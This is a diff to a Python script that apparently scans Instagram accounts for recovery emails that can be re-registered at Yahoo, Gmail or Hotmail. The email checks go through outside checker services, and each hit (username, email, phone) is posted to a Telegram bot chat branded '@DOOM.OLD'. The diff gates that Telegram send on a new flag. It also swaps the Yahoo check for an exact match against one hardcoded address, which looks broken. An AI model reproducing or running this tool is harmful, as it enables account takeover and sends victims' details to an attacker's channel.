@@ -86,18 +86,22 @@ def ops ():
 		m4=(s[-1])
 		if m1 == m3 and m2 == m4:
 			v=0
+			vx=0
 			if '@yahoo.com' in info["obfuscated_email"]:
 				req = requests.get("http://Xtools.PythonAnyWhere.Com/Yahoo/Ckeck?Email="+user+"@yahoo.com").text
-				if "Available"in req:
-					rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@yahoo.com").text
-					if "Linked Or Ban" in rm:
-						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
-						print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@yahoo.com")
-						eml=user+"@yahoo.com"
-					else:
-						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
+				if '{"email": "nceligailliams@yahoo.com", "status": "Available"}' == req:
+					pass
 				else:
 					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
+				rm=requests.get("https://jftv.pythonanywhere.com/IGMail/"+user+"@yahoo.com").text
+				if "Linked Or Ban" in rm:
+					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
+					print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@yahoo.com")
+					eml=user+"@yahoo.com"
+					vx=1
+				else:
+					print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
+				
 			elif '@gmail.com' in info["obfuscated_email"]:
 				g = {
                 'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Mobile Safari/537.36',
@@ -139,6 +143,7 @@ def ops ():
 					if "Linked Or Ban" in rm:
 						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
 						print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@gmail.com")
+						vx=1
 					else:
 						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
 				else:
@@ -151,6 +156,7 @@ def ops ():
 						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
 						print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@hotmail.com")
 						eml=user+"@hotmail.com"
+						vx=1
 					else:
 						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
 				else:
@@ -197,6 +203,7 @@ def ops ():
 						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;32mYES")
 						print("\033[1;30m[\033[0;37m$\033[1;30m] Email Available :\033[1;32m "+user+"@googlemail.com")
 						eml=user+"@googlemail.com"
+						vx=1
 					else:
 						print("\033[1;30m[\033[0;37m$\033[1;30m] Available : \033[1;31mNO"),ops()
 				else:
@@ -225,7 +232,10 @@ def ops ():
 	except:
 		print("\033[1;30m[\033[0;37m$\033[1;30m] data : \033[1;31mFalse ")
 	if X == 1:
-		tel=requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ic}&text=NEW OLD ACC\nUser : {user}\nEmail : {eml} Available or ban\nPhone : {po}\nData : {x2}\nINSTA : @DOOM.OLD | TELE : @ZXXXXZV")
+		if vx== 1:
+			tel=requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ic}&text=NEW OLD ACC\nUser : {user}\nEmail : {eml} Available or ban\nPhone : {po}\nData : {x2}\nINSTA : @DOOM.OLD | TELE : @ZXXXXZV")
+		else:
+			pass
 	else:
 		pass
 	print('\n'+'\033[1;30m='*20+'\n')
